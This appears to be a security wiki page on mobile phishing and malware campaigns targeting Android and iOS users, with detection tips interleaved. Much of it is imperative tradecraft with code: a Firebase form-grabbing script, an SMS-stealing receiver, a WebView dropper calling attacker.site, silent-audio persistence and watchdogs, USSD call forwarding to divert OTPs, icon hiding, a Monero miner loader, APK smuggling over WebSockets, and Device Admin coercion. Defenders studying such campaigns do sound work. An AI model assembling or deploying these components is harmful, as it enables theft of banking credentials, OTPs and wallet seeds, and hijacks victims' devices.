# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> This page covers techniques used by threat actors to distribute **malicious Android APKs** and **iOS mobile-configuration profiles** through phishing (SEO, social engineering, fake stores, dating apps, etc.).
> The material is adapted from the SarangTrap campaign exposed by Zimperium zLabs (2025) and other public research.

## Attack Flow

1. **SEO/Phishing Infrastructure**
   * Register dozens of look-alike domains (dating, cloud share, car service…).  
     – Use local language keywords and emojis in the `<title>` element to rank in Google.  
     – Host *both* Android (`.apk`) and iOS install instructions on the same landing page.
2. **First Stage Download**
   * Android: direct link to an *unsigned* or “third-party store” APK.  
   * iOS: `itms-services://` or plain HTTPS link to a malicious **mobileconfig** profile (see below).
3. **Post-install Social Engineering**
   * On first run the app asks for an **invitation / verification code** (exclusive access illusion).  
   * The code is **POSTed over HTTP** to the Command-and-Control (C2).  
   * C2 replies `{"success":true}` ➜ malware continues.  
   * Sandbox / AV dynamic analysis that never submits a valid code sees **no malicious behaviour** (evasion).
4. **Runtime Permission Abuse** (Android)
   * Dangerous permissions are only requested **after positive C2 response**:
     ```xml
     <uses-permission android:name="android.permission.READ_CONTACTS"/>
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
     <!-- Older builds also asked for SMS permissions -->
     ```
   * Recent variants **remove `<uses-permission>` for SMS from `AndroidManifest.xml`** but leave the Java/Kotlin code path that reads SMS through reflection ⇒ lowers static score while still functional on devices that grant the permission via `AppOps` abuse or old targets.
5. **Facade UI & Background Collection**
   * App shows harmless views (SMS viewer, gallery picker) implemented locally.  
   * Meanwhile it exfiltrates:
     - IMEI / IMSI, phone number
     - Full `ContactsContract` dump (JSON array)
     - JPEG/PNG from `/sdcard/DCIM` compressed with [Luban](https://github.com/Curzibn/Luban) to reduce size
     - Optional SMS content (`content://sms`)
     Payloads are **batch-zipped** and sent via `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
   * A single **mobile-configuration profile** can request `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. to enroll the device in “MDM”-like supervision.  
   * Social-engineering instructions:
     1. Open Settings ➜ *Profile downloaded*.
     2. Tap *Install* three times (screenshots on the phishing page).  
     3. Trust the unsigned profile ➜ attacker gains *Contacts* & *Photo* entitlement without App Store review.
7. **Network Layer**
   * Plain HTTP, often on port 80 with HOST header like `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → easy to spot).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – During malware assessment, automate the invitation code phase with Frida/Objection to reach the malicious branch.
* **Manifest vs. Runtime Diff** – Compare `aapt dump permissions` with runtime `PackageManager#getRequestedPermissions()`; missing dangerous perms is a red flag.
* **Network Canary** – Configure `iptables -p tcp --dport 80 -j NFQUEUE` to detect unsolid POST bursts after code entry.
* **mobileconfig Inspection** – Use `security cms -D -i profile.mobileconfig` on macOS to list `PayloadContent` and spot excessive entitlements.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** to catch sudden bursts of keyword-rich domains.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` from Dalvik clients outside Google Play.
* **Invite-code Telemetry** – POST of 6–8 digit numeric codes shortly after APK install may indicate staging.
* **MobileConfig Signing** – Block unsigned configuration profiles via MDM policy.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida hook to bypass invite-code HTTP check</summary>

```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
  var URL = Java.use('java.net.URL');
  URL.openConnection.implementation = function() {
    var conn = this.openConnection();
    var HttpURLConnection = Java.use('java.net.HttpURLConnection');
    if (Java.cast(conn, HttpURLConnection)) {
        conn.getResponseCode.implementation = function(){ return 200; };
        conn.getInputStream.implementation = function(){
            return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
        };
    }
    return conn;
  };
});
```

</details>

## Indicators (Generic)

```text
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```

---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Delivery chain across trusted platforms
- YouTube video lure → description contains a short link
- Shortlink → GitHub Pages phishing site imitating the legit portal
- Same GitHub repo hosts an APK with a fake “Google Play” badge linking directly to the file
- Dynamic phishing pages live on Replit; remote command channel uses Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- First APK is an installer (dropper) that ships the real malware at `assets/app.apk` and prompts the user to disable Wi‑Fi/mobile data to blunt cloud detection.
- The embedded payload installs under an innocuous label (e.g., “Secure Update”). After install, both the installer and the payload are present as separate apps.

Static triage tip (grep for embedded payloads):

```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```

### Dynamic endpoint discovery via shortlink
- Malware fetches a plain-text, comma-separated list of live endpoints from a shortlink; simple string transforms produce the final phishing page path.

Example (sanitised):

```text
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```

Pseudo-code:

```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```

### WebView-based UPI credential harvesting
- The “Make payment of ₹1 / UPI‑Lite” step loads an attacker HTML form from the dynamic endpoint inside a WebView and captures sensitive fields (phone, bank, UPI PIN) which are `POST`ed to `addup.php`.

Minimal loader:

```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```

### Self-propagation and SMS/OTP interception
- Aggressive permissions are requested on first run:

```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```

- Contacts are looped to mass-send smishing SMS from the victim’s device.
- Incoming SMS are intercepted by a broadcast receiver and uploaded with metadata (sender, body, SIM slot, per-device random ID) to `/addsm.php`.

Receiver sketch:

```java
public void onReceive(Context c, Intent i){
  SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
  for (SmsMessage m: msgs){
    postForm(urlAddSms, new FormBody.Builder()
      .add("senderNum", m.getOriginatingAddress())
      .add("Message", m.getMessageBody())
      .add("Slot", String.valueOf(getSimSlot(i)))
      .add("Device rand", getOrMakeDeviceRand(c))
      .build());
  }
}
```

### Firebase Cloud Messaging (FCM) as resilient C2
- The payload registers to FCM; push messages carry a `_type` field used as a switch to trigger actions (e.g., update phishing text templates, toggle behaviours).

Example FCM payload:

```json
{
  "to": "<device_fcm_token>",
  "data": {
    "_type": "update_texts",
    "template": "New subsidy message..."
  }
}
```

Handler sketch:

```java
@Override
public void onMessageReceived(RemoteMessage msg){
  String t = msg.getData().get("_type");
  switch (t){
    case "update_texts": applyTemplate(msg.getData().get("template")); break;
    case "smish": sendSmishToContacts(); break;
    // ... more remote actions
  }
}
```

### Hunting patterns and IOCs
- APK contains secondary payload at `assets/app.apk`
- WebView loads payment from `gate.htm` and exfiltrates to `/addup.php`
- SMS exfiltration to `/addsm.php`
- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) returning CSV endpoints
- Apps labelled as generic “Update/Secure Update”
- FCM `data` messages with a `_type` discriminator in untrusted apps

### Detection & defence ideas
- Flag apps that instruct users to disable network during install and then side-load a second APK from `assets/`.
- Alert on the permission tuple: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-based payment flows.
- Egress monitoring for `POST /addup.php|/addsm.php` on non-corporate hosts; block known infrastructure.
- Mobile EDR rules: untrusted app registering for FCM and branching on a `_type` field.

---

## GhostGrab-style Android Stealer + Miner tradecraft (WebView phishing, Firebase C2, foreground audio persistence)

The GhostGrab campaign blends a WebView-based credential stealer with a covert native Monero miner and hard persistence using foreground audio plus watchdog receivers. The following abstractions are reusable patterns to test/detect.

### Sideload + assets/WebView phishing ➜ Firebase Realtime DB exfil
- Request `REQUEST_INSTALL_PACKAGES` to enable in-app sideloading; optionally `QUERY_ALL_PACKAGES` for discovery.
- Sequence localised phishing pages under `assets/` in a JS-enabled WebView (e.g., `kyc.html → debit.html → net.html → pass.html → pin.html`).
- Each page validates input client-side and exfiltrates to Firebase Realtime DB keyed by a device identifier.

Minimal JS exfil to Firebase Realtime DB:
```html
<script>
document.addEventListener('DOMContentLoaded', () => {
  const form = document.querySelector('form');
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const payload = Object.fromEntries(new FormData(form));
    payload.DeviceID = localStorage.getItem('dev') || (crypto.randomUUID());
    localStorage.setItem('dev', payload.DeviceID);
    await fetch('https://<project>.firebaseio.com/formInfo.json', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(payload)
    });
  });
});
</script>
```

### Foreground audio persistence to defeat Doze/background kills
- Create a `NotificationChannel` and call `startForeground()` with an innocuous “Audio Playing” notification.
- Loop a silent `MediaPlayer` to maintain foreground priority and keep the process alive.

<details>
<summary>Minimal foreground audio Service</summary>

```java
public class KeepAliveService extends Service {
  private MediaPlayer mp;
  @Override public int onStartCommand(Intent i, int f, int id){
    String chId = "audio"; NotificationManager nm = getSystemService(NotificationManager.class);
    if (Build.VERSION.SDK_INT >= 26) {
      NotificationChannel ch = new NotificationChannel(chId, "Audio", NotificationManager.IMPORTANCE_LOW);
      nm.createNotificationChannel(ch);
    }
    Notification n = new NotificationCompat.Builder(this, chId)
      .setContentTitle("Audio Playing").setSmallIcon(android.R.drawable.ic_media_play).build();
    startForeground(1, n);
    mp = MediaPlayer.create(this, R.raw.silence); mp.setLooping(true); mp.setVolume(0f,0f); mp.start();
    return START_STICKY;
  }
  @Override public void onDestroy(){ try{ if (mp!=null){ mp.stop(); mp.release(); } }catch(Exception ignored){}
    super.onDestroy(); }
  @Override public IBinder onBind(Intent i){ return null; }
}
```
</details>

Watchdog and auto-revival:
- Exported broadcast receivers listen for boot, screen on/off, power/connectivity, package changes, and SMS; on any event they re-launch the core service with `startForegroundService()` and re-arm an `AlarmManager` to check/restart periodically.
- Request battery-optimization exemption via `ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` to reduce throttling.

<details>
<summary>Manifest and watchdog sketch</summary>

```xml
<service android:name=".KeepAliveService" android:foregroundServiceType="dataSync|mediaPlayback" />

<receiver android:name=".MultiEventReceiver" android:exported="true">
  <intent-filter>
    <action android:name="android.intent.action.BOOT_COMPLETED"/>
    <action android:name="android.intent.action.SCREEN_ON"/>
    <action android:name="android.intent.action.SCREEN_OFF"/>
    <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
    <action android:name="android.intent.action.PACKAGE_ADDED"/>
    <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
  </intent-filter>
</receiver>
```

```java
public class MultiEventReceiver extends BroadcastReceiver {
  @Override public void onReceive(Context c, Intent i){
    c.startForegroundService(new Intent(c, KeepAliveService.class));
    AlarmManager am = (AlarmManager) c.getSystemService(Context.ALARM_SERVICE);
    PendingIntent p = PendingIntent.getService(c,0,new Intent(c,KeepAliveService.class),PendingIntent.FLAG_IMMUTABLE);
    am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime()+60_000, p);
  }
}
```
</details>

### Firebase as covert C2 with push and DB-backed tasks
- Register to FCM to obtain a device token. Use Realtime DB collections like `clients/<DeviceID>` and `repository` to store telemetry and captured SMS.
- Implement simple C2 commands by writing control objects; client polls/listens and executes.

Example telephony/SMS commands:
- `callForward` — enable `**21*<NUMBER>#` and disable `##21#` via USSD to divert calls/voice OTPs.
- `sendSms` — send arbitrary SMS from a selected SIM slot.
- `forwardSms` — forward all incoming SMS to an operator number, with deduplication state.

Code sketches:
```java
// Call forwarding via USSD (requires CALL_PHONE)
String code = "**21*"+number+"#";
Intent ussd = new Intent(Intent.ACTION_CALL, Uri.parse("tel:"+Uri.encode(code)));
// Optional: pick SIM by PhoneAccountHandle for slot index
startActivity(ussd);

// Send SMS from a specific SIM
SmsManager mgr = SmsManager.getSmsManagerForSubscriptionId(subId);
mgr.sendTextMessage(to, null, message, null, null);
```

### SMS scraping and SIM profiling
- Keyword-based harvesting from `content://sms/` and bulk upload of the last N messages with metadata.
- Combine `SubscriptionManager` and `TelephonyManager` to fingerprint SIMs and carriers.

```java
Cursor c = getContentResolver().query(Uri.parse("content://sms/"),
  new String[]{"_id","address","body","date","type"}, null, null, "date DESC");
int n=0; while(c!=null && c.moveToNext() && n++<50){ /* collect rows */ }

List<SubscriptionInfo> subs = SubscriptionManager.from(ctx).getActiveSubscriptionInfoList();
for (SubscriptionInfo si: subs){ int slot = si.getSimSlotIndex(); String num = si.getNumber(); String carrier = String.valueOf(si.getCarrierName()); }
```

### Launcher/icon hiding
- Conceal launcher presence by omitting `CATEGORY.LAUNCHER`; use a benign category instead. Services run from receivers and foreground service.

```xml
<intent-filter>
  <action android:name="android.intent.action.MAIN"/>
  <category android:name="android.intent.category.INFO"/>
</intent-filter>
```

### Covert mobile crypto-mining
- On device-lock or specific triggers, fetch an encrypted native miner (e.g., `libmine-arm64.so`) into a private dir (e.g., `d-miner/`).
- Decrypt and load the library; start a native mining thread with TLS and Monero flags against attacker pools. Use a worker-id derived at runtime.

```java
System.load(new File(getFilesDir(), "d-miner/libmine-arm64.so").getAbsolutePath());
startMiner(new String[]{"--tls","--coin","monero","--no-color","--nicehash",
  "-o","pool.example.org:9000","-u","<XMR_wallet>","-k","-p","x"});
```

Hunting pointers:
- Foreground notification titled "Audio Playing" with a looping, muted `MediaPlayer` in an unknown app.
- Exported receivers that relaunch a foreground service on many system broadcasts; recurring `AlarmManager` wakeups.
- FCM + Firebase DB used together by an untrusted app; keys like `clients/<DeviceID>`, `repository`, and commands `callForward|sendSms|forwardSms`.
- USSD dial attempts containing `**21*` or `##21#` shortly after install.
- Monero pools and hardcoded wallet in code/strings; native `.so` miner dropped under app-private paths.

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.

Typical client flow observed in the wild:

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

Why it evades simple controls:
- No static APK URL is exposed; payload is reconstructed in memory from WebSocket frames.
- URL/MIME/extension filters that block direct .apk responses may miss binary data tunneled via WebSockets/Socket.IO.
- Crawlers and URL sandboxes that don’t execute WebSockets won’t retrieve the payload.

Hunting and detection ideas:
- Web/network telemetry: flag WebSocket sessions that transfer large binary chunks followed by creation of a Blob with MIME application/vnd.android.package-archive and a programmatic `<a download>` click. Look for client strings like socket.emit('startDownload'), and events named chunk, downloadProgress, downloadComplete in page scripts.
- Play-store spoof heuristics: on non-Google domains serving Play-like pages, hunt for Google Play UI strings such as http.html:"VfPpkd-jY41G-V67aGc", mixed-language templates, and fake “verification/progress” flows driven by WS events.
- Controls: block APK delivery from non-Google origins; enforce MIME/extension policies that include WebSocket traffic; preserve browser safe-download prompts.

See also WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

The RatOn banker/RAT campaign (ThreatFabric) is a concrete example of how modern mobile phishing operations blend WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, and even NFC-relay orchestration. This section abstracts the reusable techniques.

### Stage-1: WebView → native install bridge (dropper)
Attackers present a WebView pointing to an attacker page and inject a JavaScript interface that exposes a native installer. A tap on an HTML button calls into native code that installs a second-stage APK bundled in the dropper’s assets and then launches it directly.

Minimal pattern:

<details>
<summary>DropperActivity: WebView to PackageInstaller bridge</summary>

```java
public class DropperActivity extends Activity {
  @Override protected void onCreate(Bundle b){
    super.onCreate(b);
    WebView wv = new WebView(this);
    wv.getSettings().setJavaScriptEnabled(true);
    wv.addJavascriptInterface(new Object(){
      @android.webkit.JavascriptInterface
      public void installApk(){
        try {
          PackageInstaller pi = getPackageManager().getPackageInstaller();
          PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
          int id = pi.createSession(p);
          try (PackageInstaller.Session s = pi.openSession(id);
               InputStream in = getAssets().open("payload.apk");
               OutputStream out = s.openWrite("base.apk", 0, -1)){
            byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
          }
          PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
          pi.commit(id, status.getIntentSender());
        } catch (Exception e) { /* log */ }
      }
    }, "bridge");
    setContentView(wv);
    wv.loadUrl("https://attacker.site/install.html");
  }
}
```

</details>

HTML on the page:

```html
<button onclick="bridge.installApk()">Install</button>
```

After install, the dropper starts the payload via explicit package/activity:

```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```

Hunting idea: untrusted apps calling `addJavascriptInterface()` and exposing installer-like methods to WebView; APK shipping an embedded secondary payload under `assets/` and invoking the Package Installer Session API.

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 opens a WebView that hosts an “Access” page. Its button invokes an exported method that navigates the victim to the Accessibility settings and requests enabling the rogue service. Once granted, malware uses Accessibility to auto-click through subsequent runtime permission dialogs (contacts, overlay, manage system settings, etc.) and requests Device Admin.

- Accessibility programmatically helps accept later prompts by finding buttons like “Allow”/“OK” in the node-tree and dispatching clicks.
- Overlay permission check/request:

```java
if (!Settings.canDrawOverlays(ctx)) {
  Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
      Uri.parse("package:" + ctx.getPackageName()));
  ctx.startActivity(i);
}
```

See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operators can issue commands to:
- render a full-screen overlay from a URL, or
- pass inline HTML that is loaded into a WebView overlay.

Likely uses: coercion (PIN entry), wallet opening to capture PINs, ransom messaging. Keep a command to ensure overlay permission is granted if missing.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: periodically dump the Accessibility node tree, serialize visible texts/roles/bounds and send to C2 as a pseudo-screen (commands like `txt_screen` once and `screen_live` continuous).
- High-fidelity: request MediaProjection and start screen-casting/recording on demand (commands like `display` / `record`).

### ATS playbook (bank app automation)
Given a JSON task, open the bank app, drive the UI via Accessibility with a mix of text queries and coordinate taps, and enter the victim’s payment PIN when prompted.

Example task:

```json
{
  "cmd": "transfer",
  "receiver_address": "ACME s.r.o.",
  "account": "123456789/0100",
  "amount": "24500.00",
  "name": "ACME"
}
```

Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- Immediate lock:

```java
dpm.lockNow();
```

- Expire current credential to force change (Accessibility captures new PIN/password):

```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```

- Force non-biometric unlock by disabling keyguard biometric features:

```java
dpm.setKeyguardDisabledFeatures(admin,
    DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
    DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```

Note: Many DevicePolicyManager controls require Device Owner/Profile Owner on recent Android; some OEM builds may be lax. Always validate on target OS/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 can install and launch an external NFC-relay module (e.g., NFSkate) and even hand it an HTML template to guide the victim during the relay. This enables contactless card-present cash-out alongside online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Detection & defence ideas (RatOn-style)
- Hunt for WebViews with `addJavascriptInterface()` exposing installer/permission methods; pages ending in “/access” that trigger Accessibility prompts.
- Alert on apps that generate high-rate Accessibility gestures/clicks shortly after being granted service access; telemetry that resembles Accessibility node dumps sent to C2.
- Monitor Device Admin policy changes in untrusted apps: `lockNow`, password expiration, keyguard feature toggles.
- Alert on MediaProjection prompts from non-corporate apps followed by periodic frame uploads.
- Detect installation/launch of an external NFC-relay app triggered by another app.
- For banking: enforce out-of-band confirmations, biometrics-binding, and transaction-limits resistant to on-device automation.

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [GhostGrab Android Malware: Hybrid Banking Stealer and Monero Miner (CYFIRMA)](https://www.cyfirma.com/research/ghostgrab-android-malware/)

{{#include ../../banners/hacktricks-training.md}}